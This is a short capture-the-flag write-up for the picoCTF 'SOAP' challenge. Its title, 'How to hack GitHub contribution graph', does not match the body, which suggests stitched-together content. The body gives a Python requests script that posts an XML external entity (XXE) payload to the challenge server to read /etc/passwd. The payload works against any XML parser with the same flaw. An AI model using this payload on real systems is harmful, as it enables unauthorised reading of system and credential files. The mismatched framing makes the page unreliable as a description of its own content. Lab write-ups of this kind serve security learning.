---
title: How to hack GitHub contribution graph
published: Apr 1, 2023
language: English
---

# SOAP

**100 points**

AUTHOR: GEOFFREY NJOGU

Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Additional details will be available after launching your challenge instance.

---

using this python script you can get the flag by sending a request using python

```python
import requests

headers = {
    'Host': 'saturn.picoctf.net:port',
    # 'Content-Length': '126',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
    'Content-Type': 'application/xml',
    'Accept': '/',
    'Origin': 'http://saturn.picoctf.net:port/',
    'Referer': 'http://saturn.picoctf.net:port/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>&example;1</ID></data>'

response = requests.post('http://saturn.picoctf.net:port/data', headers=headers, data=data, verify=False)

print(response)
```

And we can see flag in the repsonse:

> picoCTF{your flag}
